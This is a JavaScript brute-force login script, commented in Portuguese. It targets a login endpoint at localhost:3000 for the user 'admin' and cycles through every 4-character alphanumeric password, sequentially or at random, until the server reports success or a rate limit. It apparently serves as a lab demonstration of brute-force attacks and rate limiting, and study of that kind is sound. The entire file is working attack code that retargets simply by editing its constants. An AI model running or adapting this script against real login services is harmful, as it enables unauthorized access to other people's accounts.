const CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const PASSWORD_LENGTH = 4;
const USERNAME = "admin";
const SERVER_URL = "http://localhost:3000/login";

// Escolha o tipo de ataque:
// "sequential" ou "random"
const ATTACK_MODE = "sequential";

// Limite para o modo aleatório
const RANDOM_MAX_ATTEMPTS = 10000;

function indexToPassword(index, charset, length) {
  const base = charset.length;
  const chars = new Array(length);

  for (let i = length - 1; i >= 0; i--) {
    chars[i] = charset[index % base];
    index = Math.floor(index / base);
  }

  return chars.join("");
}

function* sequentialGenerator(charset, length) {
  const total = charset.length ** length;

  for (let i = 0; i < total; i++) {
    yield indexToPassword(i, charset, length);
  }
}

function generateRandomPassword(charset, length) {
  let password = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    password += charset[randomIndex];
  }
  return password;
}

async function tryLogin(password) {
  const response = await fetch(SERVER_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: USERNAME,
      password
    })
  });

  const data = await response.json();
  return { response, data };
}

async function sequentialAttack() {
  console.log("Iniciando ataque sequencial...");
  console.log(`Charset: ${CHARSET.length} caracteres`);
  console.log(`Comprimento da senha: ${PASSWORD_LENGTH}`);
  console.log(`Total de combinações: ${CHARSET.length ** PASSWORD_LENGTH}`);
  console.log("------------------------------------------------");

  let attempts = 0;

  for (const password of sequentialGenerator(CHARSET, PASSWORD_LENGTH)) {
    attempts++;

    try {
      const { response, data } = await tryLogin(password);

      console.log(`[${attempts}] Tentando: ${password} | HTTP ${response.status}`);

      if (data.success) {
        console.log("------------------------------------------------");
        console.log(`Senha encontrada: ${password}`);
        console.log(`Total de tentativas: ${attempts}`);
        return;
      }

      if (response.status === 429) {
        console.log("------------------------------------------------");
        console.log("Ataque interrompido por bloqueio do servidor.");
        console.log("Resposta:", data);
        return;
      }
    } catch (error) {
      console.error("Erro durante o ataque:", error.message);
      return;
    }
  }

  console.log("Nenhuma senha encontrada.");
}

async function randomAttack() {
  console.log("Iniciando ataque aleatório...");
  console.log(`Máximo de tentativas: ${RANDOM_MAX_ATTEMPTS}`);
  console.log("------------------------------------------------");

  const tried = new Set();

  for (let attempts = 1; attempts <= RANDOM_MAX_ATTEMPTS; attempts++) {
    let password = generateRandomPassword(CHARSET, PASSWORD_LENGTH);

    // evita repetir senhas já tentadas no modo aleatório
    while (tried.has(password)) {
      password = generateRandomPassword(CHARSET, PASSWORD_LENGTH);
    }
    tried.add(password);

    try {
      const { response, data } = await tryLogin(password);

      console.log(`[${attempts}] Tentando: ${password} | HTTP ${response.status}`);

      if (data.success) {
        console.log("------------------------------------------------");
        console.log(`Senha encontrada: ${password}`);
        console.log(`Total de tentativas: ${attempts}`);
        return;
      }

      if (response.status === 429) {
        console.log("------------------------------------------------");
        console.log("Ataque interrompido por bloqueio do servidor.");
        console.log("Resposta:", data);
        return;
      }
    } catch (error) {
      console.error("Erro durante o ataque:", error.message);
      return;
    }
  }

  console.log("Limite de tentativas aleatórias atingido.");
}

async function main() {
  if (ATTACK_MODE === "sequential") {
    await sequentialAttack();
  } else if (ATTACK_MODE === "random") {
    await randomAttack();
  } else {
    console.log("ATTACK_MODE inválido. Use 'sequential' ou 'random'.");
  }
}

main();